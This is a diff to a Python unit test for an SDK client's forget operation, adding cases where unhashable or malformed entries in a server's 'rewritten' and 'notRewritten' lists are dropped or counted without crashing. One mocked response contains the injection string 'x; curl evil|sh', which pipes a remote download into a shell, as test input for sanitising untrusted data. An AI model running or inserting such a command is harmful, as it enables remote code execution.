@@ -835,6 +835,9 @@ class CloudMode(unittest.TestCase):
             # Odd answers never claim a rewrite.
             ({"rewritten": "yes", "notRewritten": 7}, None, None),
             ({"rewritten": [later, 3], "notRewritten": [later]}, None, [later]),
+            # Unhashable entries in either list: dropped or counted, never a crash.
+            ({"rewritten": [{}, [1]], "notRewritten": [[1], {}]}, None, None),
+            ({"rewritten": [[1]], "notRewritten": [{}, later]}, None, [later]),
             (b"<html>", None, None),
         ]
         with self.oort() as o:
@@ -857,7 +860,11 @@ class CloudMode(unittest.TestCase):
         self.rec.answers["DELETE /v1/memories/a1b2c3d4"] = (200, {"rewritten": ["..", good, "x; curl evil|sh"], "notRewritten": ["\u001b[31m", nxt, 7, nxt]})
         with self.oort() as o:
             r = o.forget("a1b2c3d4")
+        # Each odd entry counts, without deduping (as the CLI and the TypeScript SDK count them).
         self.assertEqual((r.rewritten, r.not_rewritten, r.not_rewritten_unnamed), ([good], [nxt], 2))
+        self.rec.answers["DELETE /v1/memories/a1b2c3d4"] = (200, {"notRewritten": [{}, {}, [1]]})
+        with self.oort() as o:
+            self.assertEqual(o.forget("a1b2c3d4").not_rewritten_unnamed, 3)
 
     def test_forget_with_an_undecodable_body_reads_as_no_lists(self) -> None:
         mem = {"id": "a1b2c3d4", "text": "The port is 3000.", "scope": {}, "tier": "warm", "pinned": False}
